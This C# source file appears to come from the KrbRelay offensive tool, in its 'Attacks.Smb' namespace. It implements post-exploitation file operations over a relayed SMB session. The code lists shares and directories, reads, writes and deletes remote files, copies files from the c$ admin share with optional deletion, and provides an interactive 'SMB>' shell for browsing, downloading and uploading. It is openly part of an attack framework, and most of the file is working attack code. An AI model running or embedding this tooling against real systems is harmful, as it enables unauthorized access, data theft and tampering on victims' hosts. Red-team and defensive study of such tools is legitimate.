using SMBLibrary;
using SMBLibrary.Client;
using SMBLibrary.Services;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace KrbRelay.Clients.Attacks.Smb
{
    internal class Shares
    {
        public static void listDir(ISMBFileStore fileStore, string path = "")
        {
            object directoryHandle;
            FileStatus fileStatus;
            var status = fileStore.CreateFile(out directoryHandle, out fileStatus, path, AccessMask.GENERIC_READ, SMBLibrary.FileAttributes.Directory, ShareAccess.Read | ShareAccess.Write, CreateDisposition.FILE_OPEN, CreateOptions.FILE_DIRECTORY_FILE, null);
            if (status == NTStatus.STATUS_SUCCESS)
            {
                List<QueryDirectoryFileInformation> queryDirectoryFileInformation;
                status = fileStore.QueryDirectory(out queryDirectoryFileInformation, directoryHandle, "*", FileInformationClass.FileDirectoryInformation);
                status = fileStore.CloseFile(directoryHandle);
                Console.WriteLine("Mode     LastAccessTime            Length    Name");
                Console.WriteLine("----     -------------             ------    ----");
                foreach (var file in queryDirectoryFileInformation)
                {
                    if (file.FileInformationClass == FileInformationClass.FileDirectoryInformation)
                    {
                        FileDirectoryInformation fileDirectoryInformation = (FileDirectoryInformation)file;

                        if (fileDirectoryInformation.FileName == "." || fileDirectoryInformation.FileName == "..")
                        {
                            continue;
                        }
                        string mode = "";
                        if (fileDirectoryInformation.FileAttributes.HasFlag(SMBLibrary.FileAttributes.Directory))
                        {
                            mode = "d-----";
                        }
                        else
                        {
                            mode = "-a----";
                        }
                        Console.WriteLine(String.Format("{0}   {1,22}    {2, -5}     {3}", mode, fileDirectoryInformation.LastAccessTime, (fileDirectoryInformation.AllocationSize / 1024), fileDirectoryInformation.FileName));
                    }
                }
            }
        }

        public static bool readFile(SMB2Client smbClient, ISMBFileStore fileStore, string path, out byte[] content)
        {
            object fileHandle;
            FileStatus fileStatus;
            var status = fileStore.CreateFile(out fileHandle, out fileStatus, path, AccessMask.GENERIC_READ | AccessMask.SYNCHRONIZE, SMBLibrary.FileAttributes.Normal, ShareAccess.Read, CreateDisposition.FILE_OPEN, CreateOptions.FILE_NON_DIRECTORY_FILE | CreateOptions.FILE_SYNCHRONOUS_IO_ALERT, null);
            if (status == NTStatus.STATUS_SUCCESS)
            {
                using (System.IO.MemoryStream stream = new System.IO.MemoryStream())
                {
                    byte[] data;
                    long bytesRead = 0;
                    while (true)
                    {
                        status = fileStore.ReadFile(out data, fileHandle, bytesRead, (int)smbClient.MaxReadSize);
                        if (status != NTStatus.STATUS_SUCCESS && status != NTStatus.STATUS_END_OF_FILE)
                        {
                            throw new Exception("Failed to read from file");
                        }
                        if (status == NTStatus.STATUS_END_OF_FILE || data.Length == 0)
                        {
                            break;
                        }
                        bytesRead += data.Length;
                        stream.Write(data, 0, data.Length);
                    }
                    content = stream.ToArray();
                }
                status = fileStore.CloseFile(fileHandle);
                return true;
            }
            content = new byte[0];
            return false;
        }

        public static bool deleteFile(ISMBFileStore fileStore, string path)
        {
            object fileHandle;
            FileStatus fileStatus;
            var status = fileStore.CreateFile(out fileHandle, out fileStatus, path, AccessMask.GENERIC_WRITE | AccessMask.DELETE | AccessMask.SYNCHRONIZE, SMBLibrary.FileAttributes.Normal, ShareAccess.None, CreateDisposition.FILE_OPEN, CreateOptions.FILE_NON_DIRECTORY_FILE | CreateOptions.FILE_SYNCHRONOUS_IO_ALERT, null);

            if (status == NTStatus.STATUS_SUCCESS)
            {
                FileDispositionInformation fileDispositionInformation = new FileDispositionInformation();
                fileDispositionInformation.DeletePending = true;
                status = fileStore.SetFileInformation(fileHandle, fileDispositionInformation);
                bool deleteSucceeded = (status == NTStatus.STATUS_SUCCESS);
                status = fileStore.CloseFile(fileHandle);
                return deleteSucceeded;
            }
            return false;
        }

        public static bool writeFile(SMB2Client smbClient, ISMBFileStore fileStore, string path, byte[] content)
        {
            object fileHandle;
            FileStatus fileStatus;
            var status = fileStore.CreateFile(out fileHandle, out fileStatus, path, AccessMask.GENERIC_WRITE | AccessMask.SYNCHRONIZE, SMBLibrary.FileAttributes.Normal, ShareAccess.None, CreateDisposition.FILE_CREATE, CreateOptions.FILE_NON_DIRECTORY_FILE | CreateOptions.FILE_SYNCHRONOUS_IO_ALERT, null);
            if (status == NTStatus.STATUS_SUCCESS)
            {
                int writeOffset = 0;
                using (System.IO.MemoryStream stream = new System.IO.MemoryStream(content))
                {
                    while (stream.Position < stream.Length)
                    {
                        byte[] buffer = new byte[(int)smbClient.MaxWriteSize];
                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
                        if (bytesRead < (int)smbClient.MaxWriteSize)
                        {
                            Array.Resize<byte>(ref buffer, bytesRead);
                        }
                        int numberOfBytesWritten;
                        status = fileStore.WriteFile(out numberOfBytesWritten, fileHandle, writeOffset, buffer);
                        if (status != NTStatus.STATUS_SUCCESS)
                        {
                            throw new Exception("Failed to write to file");
                        }
                        writeOffset += bytesRead;
                    }
                }
                status = fileStore.CloseFile(fileHandle);
                return true;
            }
            return false;
        }

        public static bool copyFile(SMB2Client smbClient, string path, bool delete, out byte[] content, string share = "c$")
        {
            ISMBFileStore fileStore = smbClient.TreeConnect(share, out var status);
            if (!readFile(smbClient, fileStore, path, out content))
            {
                return false;
            }
            if (delete)
            {
                if (!deleteFile(fileStore, path))
                {
                    Console.WriteLine("[-] Failed to remove file on remote host");
                }
            }

            return true;
        }

        public static void smbConsole(SMB2Client smbClient, string share = "ipc$")
        {
            bool exit = false;
            ISMBFileStore fileStore = smbClient.TreeConnect(share, out var status);
            if (status == NTStatus.STATUS_SUCCESS)
            {
                while (true)
                {
                    try
                    {
                        Console.Write("SMB> ");
                        string input = Console.ReadLine();
                        string cmd = input.Split(' ')[0];
                        string arg1 = "";
                        string arg2 = "";
                        try
                        {
                            arg1 = input.Split(' ')[1];
                            arg2 = input.Split(' ')[2];
                        }
                        catch { }
                        switch (cmd)
                        {
                            case "ls":
                                listDir(fileStore, arg1);
                                break;

                            case "get":
                                readFile(smbClient, fileStore, arg1, out byte[] file);
                                if (string.IsNullOrEmpty(arg2))
                                    arg2 = Path.GetFileName(arg1);
                                File.WriteAllBytes(arg2, file);
                                break;

                            case "cat":
                                readFile(smbClient, fileStore, arg1, out byte[] file2);
                                Console.WriteLine(Encoding.ASCII.GetString(file2));
                                break;

                            case "put":
                                if (string.IsNullOrEmpty(Path.GetFileName(arg2)))
                                    arg2 = Path.GetFileName(arg1);
                                writeFile(smbClient, fileStore, arg2, File.ReadAllBytes(arg1));
                                break;

                            case "rm":
                                deleteFile(fileStore, arg1);
                                break;

                            case "shares":
                                listShares(smbClient);
                                break;

                            case "use":
                                fileStore = smbClient.TreeConnect(arg1, out status);
                                break;

                            case "exit":
                                exit = true;
                                break;

                            default:
                                Console.WriteLine(
                                    "Commands:\n" +
                                    "ls <dir>\n" +
                                    "cat <file>\n" +
                                    "get <remote file> <destination file> - Download file\n" +
                                    "put <local file> <destination file>  - Upload file\n" +
                                    "rm <remote file>  - Delete file\n" +
                                    "shares            - List smb shares\n" +
                                    "use <smb share>   - Switch smb share\n" +
                                    "exit\n");
                                break;
                        }
                        if (exit)
                        {
                            break;
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e);
                    }
                }
                status = fileStore.Disconnect();
            }
            else
            {
                Console.WriteLine("[-] Could not connect to {0}", share);
            }
        }

        public static void listShares(SMB2Client smbClient)
        {
            //https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-srvs/8605fd54-6ede-4316-b30d-ecfafa133c1d
            List<ShareInfo2Entry> shares = smbClient.ListShares(out var status);
            if (status == NTStatus.STATUS_SUCCESS)
            {
                Console.WriteLine("Name         Path");
                Console.WriteLine("----         ----");
                foreach (var s in shares)
                {
                    Console.WriteLine("{0, -12} {1}", s.NetName.Value, s.Path.Value);
                }
            }
            else
            {
                Console.WriteLine("[-] ListShares: {0}", status);
            }
        }
    }
}